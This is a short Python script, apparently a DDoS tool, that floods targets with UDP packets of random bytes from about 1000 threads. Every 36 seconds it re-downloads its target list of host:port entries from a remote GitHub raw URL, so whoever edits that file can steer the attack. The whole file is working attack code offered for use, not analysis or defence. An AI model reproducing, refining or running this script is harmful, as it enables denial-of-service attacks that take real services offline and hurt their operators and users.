#!/usr/bin/env python3

import socket,time,threading,sys,random,os,subprocess,requests,urllib.request
from termcolor import colored

def Attack(target, port, kbytes, timeout):
    try:
        Bytes=os.urandom(kbytes)
        sock=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sent = 0
        while time.time()<timeout:
            b = Bytes*random.randint(1,22)
            sock.sendto(b,(target,port))
            sent=sent + 1
            #print("Sent %s packets to %s port %s with %s bytes" % (sent, target, port, len(b)))
        return
    except KeyboardInterrupt:
        sys.exit()
    except Exception as Error:
        print(Error)
 
while 1 == 1:
    timeout=time.time()+36
    testfile = urllib.request.urlretrieve ("https://raw.githubusercontent.com/Patonia/DdosRusni/main/target.txt", "target.txt")
    
    with open("target.txt",'r') as f:
        rows = f.read()
        f.seek(0)
        count_targets = len(f.readlines())
        rrows = rows.split()
        count_threads = int(1000//count_targets)
        for row in rrows:
            trgt = row.split(":")
            print(colored("Starting atack ", 'green') + "to " + colored(trgt[0], 'red') + " with " + str(count_threads) +" threads on "+ colored(trgt[1], 'red') +" port")
            for i in range(count_threads):
                #print ("Starting %s thread", i)
                threading.Thread(target=Attack, args=(trgt[0], int(trgt[1]), 1024, timeout,)).start()
    time.sleep(36)
